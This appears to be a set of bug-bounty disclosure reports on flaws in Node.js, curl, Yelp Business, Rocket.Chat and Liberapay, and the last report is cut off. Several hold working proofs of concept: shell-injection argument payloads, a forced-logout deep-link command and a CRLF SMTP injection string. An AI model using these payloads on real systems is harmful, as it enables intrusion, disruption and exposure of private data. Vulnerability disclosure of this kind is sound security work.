3817602.title: Node --run POSIX positional argument escaping allows shell command injection

profile.name: Node.js
profile.about: The Node.js JavaScript Runtime

3817602.vulnerability_information:
# 

## Summary

Node.js `node --run <script> -- <args>` attempts to append positional arguments to a package script after escaping each argument for the shell.

On POSIX platforms, the escaping logic handles single quotes incorrectly. A positional argument containing a single quote can break out of the intended quoted argument and inject additional shell syntax.

The attacker does not need to control `package.json` or the selected script. The demonstrated payload only controls one argument after `--`.

## Affected Versions

Confirmed vulnerable on Linux x64:

| Version | Result |
| --- | --- |
| v22.23.0 | Vulnerable |
| v24.17.0 | Vulnerable |
| v26.3.1 | Vulnerable |

`--run` was added in v22.0.0, so older versions that do not implement `--run` are not affected by this specific issue.

Windows was not tested.

## Attack Scenario

A service, CI bot, build wrapper, or developer tool invokes a trusted package script through Node's built-in task runner and forwards a user-controlled value as a positional argument:

```sh
node --run test -- "$user_controlled_pattern"
```

The application expects the value after `--` to be delivered to the package script as data, such as a test name, filename, glob, branch name, or filter string.

An attacker supplies a value containing a single quote and shell metacharacters. Node's task runner incorrectly escapes the argument, causing the shell to execute attacker-controlled syntax as the user running `node --run`.

## Exploit Chain Scenario

The included exploit-chain PoC models a realistic wrapper that does not use a shell at the application boundary.

The wrapper exposes an HTTP endpoint that receives a user-controlled query value and invokes Node with an argv array:

```js
spawn(process.execPath, ['--run', 'search', '--', userInput], {
  shell: false
});
```

The trusted package script is only:

```json
{
  "scripts": {
    "search": "node helper.js"
  }
}
```

A safe request forwards `safe filter value` to `helper.js` and does not create the marker file.

An attack request forwards:

```text
SAFE_ARG'; printf "chain-owned" > "$CHAIN_MARKER"; #
```

Even though the wrapper used `shell: false`, Node's internal `--run` implementation converts the single argv element into shell syntax, truncates the helper argument to `SAFE_ARG\`, and executes the injected `printf` redirection.

## Why This Is Not Just Application Misuse

Package scripts themselves are shell commands, but Node exposes a separate documented boundary for arguments after `--`.

The Node.js CLI documentation says that arguments after `--` are appended to the script:

https://github.com/nodejs/node/blob/2e190332d098124605962520182f3f279419149d/doc/api/cli.md#L2632-L2675

Node's implementation also explicitly treats these values as positional arguments that need escaping before being appended:

https://github.com/nodejs/node/blob/2e190332d098124605962520182f3f279419149d/src/node_task_runner.cc#L54-L79

The vulnerability is that Node's own escaping function does not preserve the argument boundary for single quotes on POSIX. The caller may have correctly passed a single literal argv element to `node --run`, but Node converts that argv element into shell syntax.

## Root Cause Code Evidence

`ProcessRunner` appends positional arguments by concatenating `EscapeShell(arg)` into a command string that is later passed to the shell with `-c`:

https://github.com/nodejs/node/blob/2e190332d098124605962520182f3f279419149d/src/node_task_runner.cc#L54-L79

The POSIX branch of `EscapeShell()` wraps the argument in single quotes, but replaces embedded single quotes with `\'`:

https://github.com/nodejs/node/blob/2e190332d098124605962520182f3f279419149d/src/node_task_runner.cc#L173-L182

In POSIX shell syntax, a single quote cannot be escaped with backslash while inside single quotes. The resulting command string allows an embedded single quote to close the quoted argument.

Current tests cover spaces and double quotes in positional arguments, but not single quotes:

https://github.com/nodejs/node/blob/2e190332d098124605962520182f3f279419149d/test/parallel/test-node-run.js#L143-L157

## Proof of Concept

The PoC creates a temporary package with a harmless script:

```json
{
  "scripts": {
    "show": "printf \"received:%s\\n\""
  }
}
```

It then invokes:

```sh
node --run show -- "SAFE_ARG'; printf \"command-injection\" > \"$NODE_RUN_POC_MARKER\"; #"
```

Expected safe behavior:

The complete payload is passed as one literal positional argument and no marker file is created.

Actual behavior:

The shell executes the injected `printf` redirection and creates the marker file.

## Command Execution Proof

A second PoC uses the same bug to execute `whoami`:

```text
SAFE_ARG'; whoami > "$NODE_RUN_COMMAND_OUTPUT"; #
```

Output from v26.3.1:

```json
{
  "nodeVersion": "v26.3.1",
  "platform": "linux",
  "arch": "x64",
  "proof": "whoami command execution through node --run positional argument shell injection",
  "vulnerable": true,
  "payload": "SAFE_ARG'; whoami > \"$NODE_RUN_COMMAND_OUTPUT\"; #",
  "command": "whoami",
  "commandOutput": "root",
  "commandOutputCreated": true,
  "childExitCode": 0,
  "stdout": "received:SAFE_ARG\\\n",
  "stderr": ""
}
```

This shows arbitrary shell command execution as the operating-system user running the Node.js process. In a remotely reachable wrapper or CI service that forwards attacker-controlled input to `node --run ... --`, this becomes remote command execution in that service context.

## Relevant Output

From v26.3.1:

```json
{
  "nodeVersion": "v26.3.1",
  "platform": "linux",
  "arch": "x64",
  "feature": "node --run positional argument forwarding",
  "vulnerable": true,
  "markerCreated": true,
  "markerContent": "command-injection",
  "childExitCode": 0,
  "stdout": "received:SAFE_ARG\\\n",
  "stderr": "",
  "payload": "SAFE_ARG'; printf \"command-injection\" > \"$NODE_RUN_POC_MARKER\"; #"
}
```

Raw outputs are included as attachments:

* `node-v22.23.0-output.json`
* `node-v24.17.0-output.json`
* `node-v26.3.1-output.json`
* `node-v26.3.1-whoami-output.json`
* `node-v22.23.0-http-wrapper-chain-output.json`
* `node-v24.17.0-http-wrapper-chain-output.json`
* `node-v26.3.1-http-wrapper-chain-output.json`

Exploit-chain output from v26.3.1:

```json
{
  "nodeVersion": "v26.3.1",
  "exploitChain": "remote HTTP input -> safe argv spawn wrapper -> node --run positional argument -> shell command injection",
  "vulnerable": true,
  "safeRequest": {
    "markerCreated": false,
    "helperObserved": {
      "argv": [
        "safe filter value"
      ]
    }
  },
  "attackRequest": {
    "markerCreated": true,
    "markerContent": "chain-owned",
    "helperObserved": {
      "argv": [
        "SAFE_ARG\\"
      ]
    },
    "childExitCode": 0,
    "stderr": ""
  }
}
```

## Manual Reproduction

Run on a POSIX system with an affected Node.js version:

```sh
WORKDIR="$(mktemp -d)"
cd "$WORKDIR"

cat > package.json <<'JSON'
{"scripts":{"show":"printf \"received:%s\\n\""}}
JSON

export NODE_RUN_POC_MARKER="$WORKDIR/command-executed.txt"
PAYLOAD="SAFE_ARG'; printf \"command-injection\" > \"\$NODE_RUN_POC_MARKER\"; #"

node --run show -- "$PAYLOAD"
cat "$NODE_RUN_POC_MARKER"
```

Vulnerable output:

```text
received:SAFE_ARG\
command-injection
```

The second line is printed by `cat` reading the marker file created by injected shell syntax.

## Mitigation / Workaround

Applications should avoid forwarding untrusted values to `node --run` until this is fixed.

If forwarding untrusted values is required, avoid `node --run` and invoke a trusted executable directly with an argv array through `child_process.spawn()` or equivalent APIs that do not concatenate arguments into a shell command string.

## Patch Direction

The upstream fix should ensure that positional arguments after `--` cannot alter shell syntax when appended to the package script.

Possible directions include using a correct POSIX single-quote escaping strategy, or changing the invocation model so positional arguments are passed as shell positional parameters rather than concatenated into the script string.

The final upstream fix may choose a different implementation.

## Impact

## 

This is command injection in the `node --run` positional argument forwarding boundary on POSIX.

This is especially security-relevant because the application boundary may use child_process.spawn() with an argv array and shell: false; the shell interpretation is introduced later by Node's internal --run task runner.

Impact depends on the privileges of the process invoking Node. In CI, build automation, internal web tooling, or wrapper services, this can become remote code execution as the account running the job.

The strongest impact occurs when the attacker can influence an argument after `--` but cannot otherwise control the package script or the shell command being executed.

3823985.title: Use-after-free in `mev_forget_socket` when `curl_easy_pause()` is called from a `CURL_POLL_REMOVE` socket callback (incomplete fix of CVE-2026-9080)

profile.name: curl
profile.about: cURL is an Open Source project providing a library and command-line tool doing internet transfers

3823985.vulnerability_information:
## Summary

`libcurl`'s event interface lets the application's socket callback
(`CURLMOPT_SOCKETFUNCTION`) call `curl_easy_pause()`. CVE-2026-9080 was issued for a
use-after-free that this triggers, and the fix added a post-callback re-fetch of the
socket-hash entry in the **UPDATE** leg (`mev_sh_entry_update`, `lib/multi_ev.c`).

The same re-entrancy hazard exists in the **REMOVE** leg, `mev_forget_socket()`, which
was **not** fixed: after invoking the `CURL_POLL_REMOVE` callback it dereferences the
hash entry (`entry->announced = FALSE`, `lib/multi_ev.c:216`) with no re-fetch. When the
callback calls `curl_easy_pause()`, libcurl re-enters `mev_assess()` and frees that same
entry via `Curl_hash_delete()`, so line 216 is a use-after-free. The companion path
`Curl_multi_ev_socket_done()` (`lib/multi_ev.c:618` → `mev_forget_socket`) is affected
identically.

This reproduces with a small standalone program (no fuzzer).

## Supported operation (forecloses "you're holding it wrong")

Calling `curl_easy_pause()` from within a callback is **explicitly documented and
intentionally implemented** — this is not an API misuse:
- `docs/libcurl/curl_easy_pause.md:30-32`: *"Unlike most other libcurl functions,
  curl_easy_pause(3) can be used from within callbacks."* (no socket-callback carve-out).
- Unlike the functions that reject re-entrant use with `CURLE_RECURSIVE_API_CALL`,
  `curl_easy_pause()` (`lib/easy.c:1147-1152`) deliberately has **no `Curl_is_in_callback`
  rejection** — it only records `recursive` to restore the in-callback flag afterward.
  `mev_assess()` never checks `multi->in_callback`. So the recursion guard provides no
  protection on this path.
- **CVE-2026-9080 itself** established pausing from the socket callback as supported and
  security-relevant, and shipped a fix for it — in the UPDATE leg only.

## Affected versions

- Reproduced against **curl 8.21.0** (tag `curl-8_21_0`, `LIBCURL_VERSION "8.21.0-DEV"`),
  the tree carrying the CVE-2026-9080 UPDATE-leg re-fetch.
- Independently confirmed unpatched on **curl master, HEAD `c10a7aa`** (2026-06-25):
  `mev_forget_socket` line 216 dereferences the entry after the `CURL_POLL_REMOVE`
  callback with no re-fetch — unchanged from 8.21.0, while the UPDATE leg retains the fix.

## Root cause

`lib/multi_ev.c`, `mev_forget_socket()`:

```c
static CURLMcode mev_forget_socket(struct Curl_multi *multi,
                                   struct Curl_easy *data,
                                   curl_socket_t s, const char *cause)
{
  struct mev_sh_entry *entry = mev_sh_entry_get(&multi->ev.sh_entries, s);  // 202
  ...
  if(entry->announced && multi->socket_cb) {
    mev_in_callback(multi, TRUE);
    rc = multi->socket_cb(data, s, CURL_POLL_REMOVE,
                          multi->socket_userp, entry->user_data);          // 213  callback
    mev_in_callback(multi, FALSE);
    entry->announced = FALSE;                                              // 216  <-- UAF
  }
  mev_sh_entry_kill(multi, s);                                             // 219
  ...
}
```

The fix author already documented this exact hazard — in the **UPDATE** leg
(`mev_sh_entry_update`), `lib/multi_ev.c:293`:

```c
/* ... the callback ... re-enters mev_assess() which may free this 'entry'. Re-fetch. */
entry = mev_sh_entry_get(&multi->ev.sh_entries, s);   // 294  (the CVE-2026-9080 fix)
```

`mev_forget_socket()` has the identical pattern but performs no such re-fetch before
using `entry` at line 216.

## Crash (AddressSanitizer)

(`entry->announced` is a `BIT()` bitfield, so `entry->announced = FALSE` at line 216 is a
read-modify-write of the byte — ASan reports the load half as "READ of size 1".)

Use:
```
heap-use-after-free  READ of size 1
  #0 mev_forget_socket        lib/multi_ev.c:216
  #1 socket_close             lib/cf-socket.c
  #2 cf_tcp_connect           lib/cf-socket.c:1435
  #3 cf_ip_attempt_connect    lib/cf-ip-happy.c:252   (Happy-Eyeballs closing a losing socket)
  #6 cf_ip_happy_connect      lib/cf-ip-happy.c:880
  #14 multi_socket            lib/multi.c:3302
  #15 main                    uaf_repro.c               (curl_multi_socket_action)
```
Freed by (the re-entrant pause):
```
  Curl_hash_delete            lib/hash.c:225
  mev_sh_entry_kill           lib/multi_ev.c:135
  mev_forget_socket           lib/multi_ev.c:219     (inner, during the pause)
  mev_pollset_diff            lib/multi_ev.c:439
  mev_assess                  lib/multi_ev.c:531     (curl_easy_pause re-entered here)
```

So: the outer `mev_forget_socket` (closing a Happy-Eyeballs socket during connect) calls
the REMOVE callback; the callback's `curl_easy_pause()` re-enters `mev_assess` →
`mev_pollset_diff` → an inner `mev_forget_socket` that `Curl_hash_delete`s the same
entry; control returns to the outer frame, which uses the freed entry at line 216.

## Steps to reproduce (standalone, no fuzzer)

1. Build curl with AddressSanitizer (release config so the program reaches the UAF rather
   than an unrelated debug assertion):
   ```
   ./configure --with-openssl --disable-shared --disable-debug \
       CFLAGS="-fsanitize=address -g" LDFLAGS="-fsanitize=address"
   make
   ```
   (Any TLS backend works; OpenSSL used here. A `--enable-debug` build instead trips
   `DEBUGASSERT(NULL)` at `lib/multi_ev.c:423` — the same re-entrancy corrupting the
   pollset book-keeping.)

2. Compile and run the attached `uaf_repro.c` against that libcurl:
   ```
   cc -fsanitize=address -g uaf_repro.c -o uaf_repro -lcurl -lpthread
   ./uaf_repro
   ```
   Expected: `AddressSanitizer: heap-use-after-free in mev_forget_socket (lib/multi_ev.c:216)`,
   deterministic (5/5 here).

The program: starts a loopback HTTP listener (IPv4); drives one transfer through the
event interface (`curl_multi_socket_action`); resolves the host to `[::1],127.0.0.1` so
Happy-Eyeballs abandons the `::1` attempt and closes its socket during connect; the
socket callback calls `curl_easy_pause()` on `CURL_POLL_REMOVE`.

(`uaf_repro.c` is attached.)

## Suggested fix

Apply the same fix as the UPDATE leg: do not use `entry` after the callback in
`mev_forget_socket()` — either re-fetch it (`entry = mev_sh_entry_get(...)`) before line
216, or set `entry->announced = FALSE` *before* invoking the callback. Apply the same to
`Curl_multi_ev_socket_done()` (`lib/multi_ev.c:618`).

## Impact

Heap use-after-free in `libcurl`, reachable from a normal application using the event
interface (the standard libevent / libuv integration) that calls `curl_easy_pause()` from
its socket callback — for example for read/write backpressure — when connecting to a
dual-stack host (Happy-Eyeballs is the default). It is the direct, unpatched sibling of
CVE-2026-9080.

**Severity: Low** (same as the CVE-2026-9080 parent, by the same reasoning). The use is a
single read-modify-write that clears one bitfield bit at a fixed offset in the freed
80-byte `mev_sh_entry`; the value and offset are not attacker-controlled, no information
is leaked, and there is no double-free — the subsequent `mev_sh_entry_kill` (line 219)
safely no-ops because the re-entrant path already removed the key via `Curl_hash_delete`.
The significance is that it is the unpatched twin of a fix you just shipped, reachable via
a documented-supported operation.

3826199.title: mbedTLS / wolfSSL / rustls backends silently skip hostname verification when CURLOPT_SSL_VERIFYPEER=0

profile.name: curl
profile.about: cURL is an Open Source project providing a library and command-line tool doing internet transfers

3826199.vulnerability_information:
## Summary

When an application sets `CURLOPT_SSL_VERIFYPEER=0` while keeping
`CURLOPT_SSL_VERIFYHOST=2` (the default), the mbedTLS, wolfSSL, and rustls
TLS backends silently skip the hostname-vs-certificate check. The OpenSSL,
GnuTLS, and Schannel backends correctly preserve hostname checking under
the same configuration.

`docs/libcurl/opts/CURLOPT_SSL_VERIFYPEER.md` lines 57-59 explicitly state:

> *"The check that the host name in the certificate is valid for the
> hostname you are connecting to is **done independently of the
> CURLOPT_SSL_VERIFYPEER(3) option**."*

Result: an MITM holding any valid certificate (the CN does not need to
match the requested host) can intercept TLS sessions to any HTTPS target
when an application disables peer chain verification — a common pattern
with self-signed / internal-CA deployments. `Authorization`, `Cookie`, and
POST bodies all leak to the attacker.

## Affected backends

```
$ src/curl --version    # all four built from the same source tree
curl 8.21.1-DEV (x86_64-pc-linux-gnu) libcurl/8.21.1-DEV OpenSSL/3.5.6   ← rc=60 (correct)
curl 8.21.1-DEV (x86_64-pc-linux-gnu) libcurl/8.21.1-DEV mbedTLS/3.6.5    ← rc=0 (BUG)
curl 8.21.1-DEV (x86_64-pc-linux-gnu) libcurl/8.21.1-DEV wolfSSL/5.7.2    ← rc=0 (BUG)
curl 8.21.1-DEV (x86_64-pc-linux-gnu) libcurl/8.21.1-DEV rustls-ffi/0.15.3 ← rc=0 (BUG)
```

Affected versions: **all curl releases through HEAD master** for the
mbedTLS, wolfSSL, and rustls backends. The mbedTLS code path traces to
commit `88cae145509` (2024-08-17, "mbedtls: add more informative logging"),
shipped in 8.10.0 and unchanged through current master.

The relevant code sites:

- **mbedTLS** — `lib/vtls/mbedtls.c::mbed_verify_cb`:
  ```c
  if(!conn_config->verifypeer)
      *flags = 0;                /* clears CN_MISMATCH along with chain flags */
  else if(!conn_config->verifyhost)
      *flags &= ~MBEDTLS_X509_BADCERT_CN_MISMATCH;
  ```
  `*flags = 0` zeroes the entire mbedTLS verify-flag bitmap, including
  `MBEDTLS_X509_BADCERT_CN_MISMATCH`. mbedTLS uses
  `MBEDTLS_SSL_VERIFY_REQUIRED` and trusts whatever flags this callback
  returns.

- **wolfSSL** — `lib/vtls/wolfssl.c::Curl_wssl_ctx_init`:
  ```c
  wolfSSL_CTX_set_verify(wctx->ssl_ctx, conn_config->verifypeer ?
                         WOLFSSL_VERIFY_PEER : WOLFSSL_VERIFY_NONE, NULL);
  ```
  When `verifypeer=0`, `WOLFSSL_VERIFY_NONE` makes wolfSSL skip the entire
  certificate-validation pipeline including the hostname check registered
  by `wolfSSL_check_domain_name` further down.

- **rustls** — `lib/vtls/rustls.c::cr_init_backend` (line 1048-1050):
  ```c
  if(!conn_config->verifypeer) {
      rustls_client_config_builder_dangerous_set_certificate_verifier(
          config_builder, cr_verify_none);
  }
  ```
  `cr_verify_none` (line 389) is a callback that returns `RUSTLS_RESULT_OK`
  unconditionally. It replaces rustls's default `ServerCertVerifier`, which
  in rustls performs both chain validation **and** hostname matching against
  the SNI value passed to `rustls_client_connection_new`. Replacing it
  disables both at once.

## Steps to reproduce

A self-contained Docker reproduction package is attached
(`verifyhost-repro.tar.gz`). It pulls the latest curl source from
`github.com/curl/curl.git`, builds four libcurls from the same source tree
(OpenSSL, mbedTLS, wolfSSL, rustls backends), runs a TLS server presenting
a wrong-CN certificate, and drives a libcurl client at all four backends.

```sh
tar xzf verifyhost-repro.tar.gz
cd docker
./build_and_run.sh
```

(Pass a tag/branch/SHA as arg to pin: `./build_and_run.sh curl-8_21_0`.)

Expected output:

```
================================================================
  curl source commit:       <SHA from official curl/curl repo>
  OpenSSL curl --version:   curl 8.21.1-DEV libcurl/8.21.1-DEV OpenSSL/3.5.6 ...
  mbedTLS curl --version:   curl 8.21.1-DEV libcurl/8.21.1-DEV mbedTLS/3.6.5 ...
  wolfSSL curl --version:   curl 8.21.1-DEV libcurl/8.21.1-DEV wolfSSL/5.7.2 ...
  rustls  curl --version:   curl 8.21.1-DEV libcurl/8.21.1-DEV rustls-ffi/0.15.3 ...
================================================================

============== OpenSSL backend (control) — expect rc=60 ==============
* SSL: certificate subject name 'wrong.example.com' does not match target hostname 'target.example.com'
=== RESULT: rc=60 (SSL peer certificate or SSH remote key was not OK) ===

============== mbedTLS backend — expect rc=0 (BUG) ==============
< HTTP/1.1 200 OK
< Content-Length: 7
=== RESULT: rc=0 (No error) ===

============== wolfSSL backend — expect rc=0 (BUG) ==============
< HTTP/1.1 200 OK
=== RESULT: rc=0 (No error) ===

============== rustls backend — expect rc=0 (BUG) ==============
< HTTP/1.1 200 OK
=== RESULT: rc=0 (No error) ===
```

The OpenSSL run is the control: same source tree, same flags, same PoC
code — only the TLS backend differs. Its `rc=60` confirms that the PoC
correctly enforces `verifyhost=2` and that the `rc=0` on the other three
backends is a backend defect, not a PoC mistake.

## Files in the package

- `Dockerfile` — Debian trixie + mbedTLS 3.6.5 + OpenSSL 3.x + wolfSSL 5.7.2 + rustls-ffi 0.15.3
- `build_and_run.sh` — wrapper: `docker build` then `docker run`
- `run.sh` — entrypoint inside container; drives all four scenarios
- `poc.c` — minimal libcurl PoC
- `poc_server.py` — Python TLS server presenting CN=wrong.example.com

## ████████
████████

## Impact

## Summary:

An MITM on the network path can fully impersonate the intended HTTPS
server using any certificate (no need to match the requested hostname),
decrypting and modifying the entire TLS session. The application has
opted out of chain verification but explicitly kept hostname verification
on per the documented contract; libcurl silently disables both.

3829030.title: Debug Deep Link Abuse Allows Repeated Forced Logout and Application Disruption

profile.name: Yelp
profile.about: Connecting people to great local businesses in communities around the world.

3829030.vulnerability_information:
# **1. Summary**

The Android application **`com.yelp.android.biz`** contains an exposed deep link:

```text
yelp-biz:///debug_navigation
```

Triggering this deep link externally causes the application to crash. After the application is restarted, the current user session is invalidated and the user is forced to log in again.

Because Android applications can invoke exported deep links in other applications, any malicious application installed on the same device can repeatedly trigger this behavior, resulting in a persistent local Denial of Service (DoS) against the victim.

---

# **2. Affected Component**

* **Package:** `com.yelp.android.biz`
* **Deep Link:** `yelp-biz:///debug_navigation`

---

# **3. Steps to Reproduce**

1. Install and log in to the Yelp Business application.
2. Execute the following command:

```bash
adb shell am start -a android.intent.action.VIEW -d "yelp-biz:///debug_navigation"
```

3. Observe that:

   * The application immediately crashes.
   * Upon reopening the application, the user has been logged out.
   * The user is required to authenticate again.

4. Repeat the command multiple times to continuously interrupt application usage.

---

# **4. Proof of Concept**

```bash
adb shell am start -a android.intent.action.VIEW -d "yelp-biz:///debug_navigation"
```

---

# **5. Security Impact**

Any malicious application installed on the same Android device can invoke this deep link without requiring special permissions.

This allows an attacker to:

* Force the Yelp Business application to crash.
* Cause the current user session to be terminated.
* Force repeated logouts.
* Prevent normal use of the application by continuously invoking the vulnerable deep link.
* Create a persistent local Denial of Service against the victim.

Although this issue does not directly expose sensitive information or allow account takeover, it significantly impacts the application's availability and user experience.

---

# **6. Real-World Scenario**

Consider a seemingly harmless application installed from a third-party marketplace or bundled with another application.

The malicious application silently executes:

```java
Intent intent = new Intent(Intent.ACTION_VIEW);
intent.setData(Uri.parse("yelp-biz:///debug_navigation"));
startActivity(intent);
```

It can trigger this periodically in the background or whenever the victim attempts to use Yelp Business.

As a result:

* The application repeatedly crashes.
* The user is continuously logged out.
* Business owners may be unable to quickly access orders, messages, or account management features.
* Users may believe their account has been compromised or that the application is unstable.
* This can generate unnecessary support requests, damage user trust, and negatively affect the application's reputation.

Since Yelp Business is used by businesses to manage their operations, repeated forced logouts can disrupt normal workflows and reduce productivity.

---

# **7. Root Cause**

The application exposes a debug deep link (`yelp-biz:///debug_navigation`) that is accessible from outside the application.

The deep link is not properly protected or restricted and leads to an unhandled application state that causes:

* Application crash.
* Session invalidation after restart.
* Forced user logout.

Debug or internal navigation endpoints should not be reachable by untrusted external applications, especially when they can affect application availability or authentication state.

### Video PoC:

{F6162875}

---

# **8. Recommended Fix**

* Remove debug deep links from production builds.
* Restrict internal debug routes so they cannot be invoked by external applications.
* Validate incoming deep links before processing.
* Gracefully handle unexpected navigation requests without crashing.
* Ensure application crashes do not invalidate authenticated user sessions unless explicitly required.
* Restrict exported intent filters where external access is unnecessary.

3852135.title: DDP methods getThreadsList / getThreadMessages leaks private thread content to any authenticated low privilege user (unpatched sibling of #1446767)

profile.name: Rocket.Chat
profile.about: Rocket.Chat is a company built on open source values and a love for efficiency. The company is driven by our amazing community of contributors.

summaries.content:
The Meteor DDP methods getThreadsList and getThreadMessages accept rid / tmid as raw, untyped parameters with no schema validation. A MongoDB operator object (e.g. {"$gt": "4"}) can be substituted for a string room-id or message-id. The authorization check resolves to a room the attacker already has access to, while the downstream data query fans out across all rooms - disclosing private thread parents and their full reply content to any low-privilege authenticated user.
The REST route chat.getThreadsList was patched in v5.0 (HackerOne report #1446767) by adding rid: {type:'string'} AJV validation. The equivalent DDP method was never given the same fix and remains exploitable

3878586.title: Unauthenticated team "income/payments" export ignores donor privacy settings (hide_giving, hide_from_lists) and uses frozen visibility, exposing donat

profile.name: Liberapay
profile.about: An open source platform designed to facilitate recurrent donations.

3878586.vulnerability_information:
Liberapay lets teams publish the list of donors who chose to donate **publicly** (donation
`visibility = 3`). That public list is served by `www/%username/income/payments.spt`. The problem
is that this endpoint decides whether to reveal a donor using **only** the payment's frozen
visibility flag, and ignores the two donor privacy controls that every other public surface honors
(`hide_giving`, `hide_from_lists`) as well as the recipient's opt‑in gate. As a result an
unauthenticated attacker can retrieve donor identity + exact amount + date for donations that the
donor has explicitly opted out of public listings for, or has **since changed to private/secret**.

## The privacy model it should follow
The canonical public patron list on the team's profile page (`www/%username/index.html.spt`) gates
each donor on **all** of the following:
- `index.html.spt:32` — recipient opted in: `if patron_visibilities & 4:`
- `index.html.spt:42` — `AND tip.visibility = 3`
- `index.html.spt:45` — `AND NOT tipper_p.hide_giving`
- `index.html.spt:46` — `AND tipper_p.hide_from_lists = 0`
- it also reads the **current** visibility from `current_tips`.

## Root cause (code)
`www/%username/income/payments.spt`:
- `:33` `participant = get_participant(state, restrict=False)` → **unauthenticated**.
- `:34` only constraint is `if participant.kind != 'group'` (teams only).
- `:51‑53` selects `payer.id`, `payer.username`, `payer.public_name`.
- `:62` the **only** donor‑identity gate:
  ```sql
  LEFT JOIN participants payer ON payer.id = pi.payer AND pt.visibility = 3
  ```
It omits `hide_giving`, omits `hide_from_lists`, omits the recipient `patron_visibilities & 4`
gate, and reads `pt.visibility` = **`payin_transfers.visibility`**, which is set once at payment
time (`liberapay/payin/common.py:752`, `abs(visibility)`) and is **never updated** afterwards
(none of the four `UPDATE payin_transfers` statements touch the `visibility` column; changing a
donation's visibility via `set_tip_to` / the giving page only INSERTs a new `tips` row). So the
per‑payment visibility is frozen forever.

Two concrete consequences, each a privacy violation:
1. **Opt‑out ignored.** A donor who set `hide_from_lists = 1` (explicit "exclude me from public
   lists") or `hide_giving` is still fully listed here — name + exact per‑payment amount + date —
   even though the team's own profile page excludes them.
2. **Downgrade ignored (strongest case).** A donor who made a public donation and **later changed
   that donation to private or secret** disappears from the profile page and from
   `/<team>/patrons/public.csv` (both read `current_tips.visibility`), but their historical public
   payments remain exposed here because this endpoint reads the frozen `payin_transfers.visibility`.
   The donor took a deliberate privacy action and reasonably believes it is now hidden everywhere.

## Proof — unauthenticated disclosure surface (confirmed live 2026‑07‑21)
```
GET https://liberapay.com/GIMP/income/payments.json HTTP/2
Host: liberapay.com
(no Cookie, no session)
```
→ HTTP 200, JSON array (45 KB). Public‑donation entries return
`"payer_id": <int>, "payer_username": "<username>", "payer_public_name": "<real name>"` plus
`amount`, `unit_amount`, `period`, `n_units`, `date`, `payment_method`. Non‑public entries return
`payer_id/username/public_name = null`, confirming the sole gate is `pt.visibility = 3`.
(Real donor identities were returned; they are redacted in `evidence/income-payments-disclosure.md`.)
`/<team>/income/payments.csv` returns the **entire** history in one request (per_page defaults to
`None` for CSV, no pagination cap).

## Full end‑to‑end PoC for the privacy bypass (donor account + one small donation)
1. Register free account **A**.
2. As A, make a **public** (`visibility=3`) donation to any team and complete the payment
   (any small amount).
3. As A, either (a) set the donation's visibility to **secret** on `/<A>/giving/`, or (b) enable
   **"Hide me from public lists"** (`hide_from_lists`) in privacy settings.
4. Verify A no longer appears on `https://liberapay.com/<team>/` (profile) nor in
   `https://liberapay.com/<team>/patrons/public.csv`.
5. Fetch `https://liberapay.com/<team>/income/payments.json` **unauthenticated** → account A is
   still listed with username, exact amount, and date.

## Impact

Unauthenticated third‑party disclosure of donor identity, exact donation amount, and dates for a
team's public donors, bypassing the donor's explicit `hide_giving` / `hide_from_lists` opt‑outs and
continuing to expose donations the donor has since made private or secret. Donation relationships
and amounts are the platform's core privacy asset.

## Remediation
Make the query match the profile page's model:
```sql
LEFT JOIN participants payer
       ON payer.id = pi.payer
      AND pt.visibility = 3
      AND payer.hide_giving IS NOT TRUE
      AND payer.hide_from_lists = 0
```
and gate the endpoint on the recipient's `patron_visibilities & 4`, and filter on the **current**
tip visibility (join `current_tips`) rather than the frozen `payin_transfers.visibility`, so that a
donor's later privacy change is honored here as it is everywhere else.

3911605.title: SMTP CRLF injection in custom SMTP recipient operand allows additional SMTP commands after authentication

profile.name: curl
profile.about: cURL is an Open Source project providing a library and command-line tool doing internet transfers

3911605.vulnerability_information:
## Summary

During testing of curl 8.18.0, I observed that CRLF characters embedded in the SMTP recipient operand used with a custom SMTP request are transmitted as additional SMTP commands.

The injected commands are accepted and processed after successful SMTP authentication, allowing multiple SMTP commands to be executed within the same authenticated session.

---

## Product

curl CLI

Version tested:

```
curl 8.18.0
Release-Date: 2026-01-07
```

---

## Environment

* OS: Kali Linux
* curl: 8.18.0
* SMTP AUTH: PLAIN

---

## Steps to Reproduce

1. Configure curl to perform an authenticated SMTP session using a custom SMTP request (EXPN).

2. Supply a recipient operand containing embedded CRLF characters followed by additional SMTP commands.

Example payload structure:

```text
Friends\r\n
MAIL FROM:<probe-sender@example.com>\r\n
RCPT TO:<probe-recipient@example.com>\r\n
DATA\r\n
Subject: injected\r\n
\r\n
curl-smtp-injection-marker-v1\r\n
.
```

3. Execute the SMTP request.

---

## Observed Behavior

The SMTP session authenticates successfully.

Instead of treating the recipient operand as a single parameter, curl transmits the embedded CRLF characters, causing the SMTP server to interpret the following data as additional SMTP commands.

Observed command sequence:

```text
EHLO probe
AUTH PLAIN
EXPN Friends
MAIL FROM:<probe-sender@example.com>
RCPT TO:<probe-recipient@example.com>
DATA
Subject: injected

curl-smtp-injection-marker-v1
.
QUIT
```

The SMTP server accepted the injected transaction and completed the DATA phase successfully.

---

## Expected Behavior

CR and LF characters should not be permitted inside the SMTP recipient operand.

The value should be validated before serialization so it cannot terminate the current SMTP command and inject additional commands.



---

## Evidence

The attached screenshots demonstrate:

* curl version
* Successful authenticated SMTP session
* Additional injected SMTP commands
* Successful completion of the injected DATA transaction
* Marker confirming successful command injection

## Impact

An application that passes attacker-controlled input into the SMTP recipient operand while using custom SMTP requests may unintentionally execute additional SMTP commands within an authenticated SMTP session.

Depending on the application's usage of libcurl/curl, this may allow unintended SMTP operations.

3911968.title: Heap use-after-free (write) in mev_forget_socket() via reentrant curl_easy_pause() — incomplete fix for CVE-2026-9080

profile.name: curl
profile.about: cURL is an Open Source project providing a library and command-line tool doing internet transfers

3911968.vulnerability_information:
lib/multi_ev.c keeps a hash table (multi->ev.sh_entries) of per-socket
bookkeeping structs (struct mev_sh_entry) used to decide when to notify the
application's socket callback (CURLMOPT_SOCKETFUNCTION) about interest
changes on a socket.

CVE-2026-9080 ("multi: handle pause in multi socket callback", commit
5ab34cba42e4ee4282fe8bab43f311d51b9bf9bd, reported by Joshua Rogers, closes
#21748) fixed a heap-use-after-free in mev_sh_entry_update(): that function
calls multi->socket_cb(...) and then writes to the `entry` it fetched
*before* the call. curl_easy_pause() is documented as callable from any
callback, and calling it reenters Curl_multi_ev_assess_xfer() ->
mev_pollset_diff(), which can delete (free) that very `entry` if the
reentrant assessment concludes the socket has no remaining users. The fix
re-fetches `entry` from the hash table after the callback returns, before
